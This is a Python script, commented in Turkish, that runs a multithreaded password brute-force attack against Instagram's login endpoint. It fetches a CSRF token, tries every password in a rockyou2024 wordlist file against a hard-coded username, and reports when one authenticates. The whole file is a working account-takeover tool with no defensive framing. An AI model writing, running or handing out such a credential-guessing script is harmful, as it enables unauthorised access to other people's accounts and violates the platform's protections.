import requests
import threading
from tqdm import tqdm

# Instagram giriş sayfasından CSRF token'ını alır
def get_csrf_token():
    url = "https://www.instagram.com/accounts/login/"
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        # CSRF token'ını HTML'den çekiyoruz
        csrf_token = response.cookies.get('csrftoken')
        return csrf_token
    else:
        print("CSRF token alınamadı.")
        return None

# Instagram giriş işlemi
def instagram_login(username, password, csrf_token):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-CSRFToken": csrf_token
    }
    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}"
    }

    with requests.Session() as session:
        session.headers.update(headers)
        response = session.post(url, data=payload)
        if response.status_code == 200:
            try:
                json_response = response.json()
                return json_response
            except ValueError:
                print(f"Response Error: {response.text}")  # Yanıt hatası durumunda mesaj basıyoruz.
                return None
        else:
            print(f"HTTP Error: {response.status_code}")
            return None

# Şifre kırma işlemi
def brute_force(username, password_list, threads=4):
    csrf_token = get_csrf_token()

    if not csrf_token:
        print("CSRF token alınamadı. Giriş yapılamaz.")
        return

    # Dosyayı UTF-8 ile açıyoruz, bu sayede Türkçe karakterler ve özel karakterler doğru şekilde okunur
    with open(password_list, "r", encoding="utf-8") as file:
        passwords = file.readlines()

    found_event = threading.Event()  # Doğru şifre bulunduğunda diğer iş parçacıklarını durduracak event

    def worker(passwords, found_event, pbar):
        for password in passwords:
            if found_event.is_set():  # Eğer doğru şifre bulunmuşsa, thread duracak
                return
            password = password.strip()
            print(f"Şifre deneniyor: {password}")
            result = instagram_login(username, password, csrf_token)
            if result:
                # Yanıtın içeriğine göre kontrol et
                if result.get("authenticated"):
                    print(f"Doğru şifre bulundu: {password}")
                    found_event.set()  # Şifre bulundu, event tetiklendi
                    pbar.set_postfix(status="Şifre bulundu!")  # İlerleme çubuğunda durumu göster
                    return
                else:
                    # Hatalı giriş durumlarını kontrol et
                    if 'message' in result:
                        print(f"Hata mesajı: {result['message']}")  # Hata mesajını yazdır
                    elif 'error_type' in result:
                        print(f"Error Type: {result['error_type']}")  # Hata türünü yazdır

    # Kullanıcıya şifreleri her iş parçacığına eşit dağıtacak şekilde bölme
    with tqdm(total=len(passwords)) as pbar:
        threads_list = []
        chunk_size = len(passwords) // threads  # İş parçacığı başına denenecek şifre sayısı
        for i in range(threads):
            start_index = i * chunk_size
            end_index = (i + 1) * chunk_size if i < threads - 1 else len(passwords)
            thread_passwords = passwords[start_index:end_index]
            thread = threading.Thread(target=worker, args=(thread_passwords, found_event, pbar))
            threads_list.append(thread)
            thread.start()

        for thread in threads_list:
            thread.join()
            pbar.update(len(thread_passwords))  # Her iş parçacığı için ilerleme çubuğunu güncelle

    if not found_event.is_set():  # Eğer doğru şifre bulunamadıysa
        print("Doğru şifre bulunamadı.")  # Bulunamadı mesajı

# Ana program
if __name__ == "__main__":
    username = "01hackmack"  # Instagram kullanıcı adınızı buraya yazın
    password_list = r"C:\Users\Ümit\Desktop\rockyou_parts\rockyou2024_part_aa"  # Şifre listesinin yolu (Windows'ta tam yolu belirtin)
    threads = 4  # Kullanılacak iş parçacığı sayısı

    brute_force(username, password_list, threads)
